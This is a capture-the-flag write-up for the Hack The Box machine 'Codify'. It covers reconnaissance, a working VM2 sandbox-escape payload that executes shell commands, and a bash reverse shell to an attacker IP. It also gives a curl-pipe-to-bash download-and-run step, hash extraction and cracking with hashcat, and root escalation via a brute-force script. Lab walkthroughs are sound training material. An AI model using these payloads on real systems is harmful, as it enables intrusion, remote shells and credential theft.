---
published: true
author: Rubaiat Hossain
tags:
  - write-ups
  - htb
---

# HTB Codify Pwn'd - Write Up

Join and then create an `/etc/hosts` entry for the Codify box. Replace the IP address with the IP of your Codify machine.

```bash
echo "10.10.11.239 codify.htb" | sudo tee -a /etc/hosts
```

## Initial NMAP Scan

Now, we perform an nmap scan to see which ports are open and what services are available.

```bash
nmap -sC -sV -oA /nmap/initial-scan 10.10.11.239
```

We can see the following from the nmap scan output.

```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://codify.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
3000/tcp open  http    Node.js Express framework
|_http-title: Codify
Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

So, this is a Linux box running an Apache `http` server on port 80, a Node.js express framework on port 3000, and `ssh` port 22 is also open.

## Check the Application

Let's go ahead and open the [codify.htb]() URL in the browser.  We see there's a **Editor** section that allows us to run JavaScript code in a sandbox environment. We also learn from the **About** page that the editor is using the open-source package **VM2** to provide the sand-boxing environment.

A quick google search tells us that this package is now deprecated and may be vulnerable to command injection attacks through sandbox escaping.

## Check Vulnerability

You can confirm that the application is indeed vulnerable to command injection by running the following JS code in the editor.

```js
const version = require("vm2/package.json").version;

if (version < "3.9.17") {
    console.log("vulnerable!");
} else {
    console.log("not vulnerable");
}
```


As you can see, this application is vulnerable due to the VM2 package version being deprecated. You can get the exact version number by running -

```js
const version = require("vm2/package.json").version;
console.log(version);
```

## Exploit Codify Editor [HTB]

We can now try to exploit this vulnerable editor. A few google searches led me to [this page on the VM2 GitHub repository](https://github.com/patriksimek/vm2/issues/533#issuecomment-1750654480)

Copy and run the following code to the Codify editor to escape the sandbox and get command execution on the machine.

```js
const {VM} = require("vm2");

const vm = new VM();

const code = `
const g = ({}).__lookupGetter__;
const a = Buffer.apply;
const p = a.apply(g, [Buffer, ['__proto__']]);
p.call(a).constructor('return process')().mainModule.require('child_process').execSync('whoami');
`;

vm.run(code);
```

This should print `svc`, which is the user we are interacting as.

## Privilege Escalation

Now that we can execute commands inside the box, we need to find a way to escalate our privileges. Let's run some basic OS commands to get an overview of the machine and its users.

```bash
execSync('whoami');
```

Replace the `whoami` part of the JS exploit with the following commands to get OS and user information.

**Command** -

```bash
(cat /proc/version || uname -a ) 2>/dev/null
```

**Output** -

```bash
Linux version 5.15.0-88-generic (buildd@lcy02-amd64-058) (gcc (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #98-Ubuntu SMP Mon Oct 2 15:18:56 UTC 2023

```

**Command** -

```bash
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
```

**Output** -

```bash
uid=0(root) gid=0(root) groups=0(root)
uid=1000(joshua) gid=1000(joshua) groups=1000(joshua)
uid=1001(svc) gid=1001(svc) groups=1001(svc)
uid=100(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=101(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
uid=102(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
uid=103(messagebus) gid=104(messagebus) groups=104(messagebus)
uid=104(systemd-timesync) gid=105(systemd-timesync) groups=105(systemd-timesync)
uid=105(pollinate) gid=1(daemon) groups=1(daemon)
uid=106(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=107(syslog) gid=113(syslog) groups=113(syslog),4(adm)
uid=108(uuidd) gid=114(uuidd) groups=114(uuidd)
uid=109(tcpdump) gid=115(tcpdump) groups=115(tcpdump)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=110(tss) gid=116(tss) groups=116(tss)
uid=111(landscape) gid=117(landscape) groups=117(landscape)
uid=112(usbmux) gid=46(plugdev) groups=46(plugdev)
uid=113(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
uid=114(fwupd-refresh) gid=122(fwupd-refresh) groups=122(fwupd-refresh)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=1(daemon) gid=1(daemon) groups=1(daemon)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=998(_laurel) gid=998(_laurel) groups=998(_laurel)
uid=999(lxd) gid=100(users) groups=100(users)
uid=9(news) gid=9(news) groups=9(news)
```

This command shows that there's a user called `joshua` on this system. We can now try to escalate into his account from our `svc` account. However, before we do that, let's get a proper shell into the Codify box so that we don't have to deal with putting commands in the JS editor manually.

## Spawn Reverse Shell into Codify

We can spawn a TCP reverse shell into the box by downloading the following shell script into Codify and executing it. Open a text editor and paste the following snippet and name the file as `shell.sh`

```bash
#!/bin/bash

bash -c 'bash -i >& /dev/tcp/10.10.14.151//1337 0>&1'
```

Change the IP address to your own tun0 interface IP address. You can use the below command to retrieve your attack box IP.

```bash
ip a | grep tun0
```

Now, fire up an HTTP server on your attack box so that you can deliver this shell script into the target box(Codify). You can use the following Python one-liner.

```bash
python3 -m http.server 9000
```

You can now download the shell script from the target machine using curl. However, before we do that, let's create a `netcat` listener on another terminal so that we can interact with the shell.

```bash
nc -lvnp 1337
```

Finally, deliver the shell script by typing the following command in the Codify Editor box(inside `execSync('whoami');` )

```bash
curl http://10.10.14.151:9000/shell.sh|bash
```

It should spawn a TCP reverse shell in your `netcat` terminal. Since it's not very stable, let's run the following few commands to get a proper shell with nice color highlighting.

From inside the `netcat` terminal running the reverse shell -

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Hit enter and when it runs, press `Ctrl+Z`

```bash
^Z
```

Now run -

```bash
stty raw -echo && fg
```

This should bring up a nice color-highlighted terminal in your Codify machine through the `netcat` listener.

## User Escalation in Codify HTB Box

By playing arounf the directories in the Codify box from our `svc` user, we find several interesting directories. One of the most promising option is the `/var/www` directory.

```bash
cd /var/www
ls
```

Let's go into `contact/` and check out the `tickets.db` file to see if we can find anything interesting.

```bash
cd contact/
cat tickets.db
```

Scroll down and you will see that there's a user called `joshua` and a password that seems to be hashed. If we can break this hash and retrieve the password then we can get the user flag.

Let's copy this hash to a file for processing.

```bash
nano hash.txt
```

```txt
$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
```

Now, run the `hashid` command from your attack box to find out the hash type. It's pre-installed on Kali.

```bash
hashid hash.txt
```

This should reveal that the hashed password uses the `Blowfish` cipher. Let's break this hash down using `hashcat`, also pre-installed on Kali.

```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

Give `hashcat` a few minutes and it will crack the hash for you. Once finished, run the following command to view the password.

```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt --show
```

We see that the password for user `joshua` is `spongebob1`. Let's try ssh-ing into the box using this credential.

```bash
ssh joshua@codify.htb
```

Accept the fingerprint and type in the password to log into the box as user `joshua`.

```bash
ls
cat user.txt
```

Voila! there you have the user flag.

## Gain Root Access to Codify HTB

Gaining root access to this box wasn't so tricky for me. I simply ran `sudo -l` to see what commands I can run as root. It turns out there's a shell script in `/opt/scripts` directory called `mysql-backup.sh`.

```bash
cd /opt/scripts
cat mysql-backup.sh
```

This file can be brute-forced for the `root` password. A few google searches led me to [this gist](https://gist.githubusercontent.com/m3m0o/d361597c44d252620919257641e11fc4/raw/32894444870d9cc49684950e1f184a2955a19b88/get_db_password.sh)

Save the code to a file called `crack-pass.sh` in the `/tmp` directory of the Codify box. From there, simply run the following -

```bash
chmod +x crack-pass.sh
./crack-pass.sh
```

Wait for a minute and the script will return the root password. You can then simply switch to the root account and retrieve the root flag for the Codify HTB box.

```bash
su root
cd /root
cat root.txt
```

And you finally get the root flag.

# My thoughts

Codify is definitely pwned. But I have reasons to believe this box can be pwned in a number of other ways. For example, we could have ssh'd into the Codify HTB box for initial access by constructing a payload that delivers the public IP of our attack box to the `~/.ssh/authorized_keys` directory of Codify - using the Editor tool. I also had some interesting ideas that involved Kernel CVE's and exploiting flaws in the Apache `httpd` server.

I'll try my best to apply those ideas into action and potentially pwn this simple HTB box in multiple ways. Stay tuned and don't forget to check this page again so you don't miss any interesting exploitation techniques to pwn HTB Codify.
